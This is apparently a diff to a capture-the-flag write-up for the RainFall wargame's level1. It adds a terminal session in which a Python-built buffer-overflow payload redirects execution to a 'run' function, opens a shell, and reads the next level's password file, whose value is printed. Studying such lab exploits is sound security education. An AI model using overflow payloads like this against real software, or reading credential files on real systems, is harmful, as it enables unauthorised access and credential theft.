@@ -34,7 +34,12 @@ Non-debugging symbols:
 We have all the information we need to create our exploit. We need to send 80 bytes to overflow the buffer and overwrite the return address with the address of `run` (`0x08048444`). We can use Python to create the payload:
 
 ```python
-(python -c "print 'A' * 76 + '\x44\x84\x04\x08'"; cat) | ./level1
+level1@RainFall:~$ (python -c "print 'A' * 76 + '\x44\x84\x04\x08'"; cat) | ./level1
+Good... Wait what?
+whoami
+level2
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 ```
 We inverse the address because of little-endian format.
 
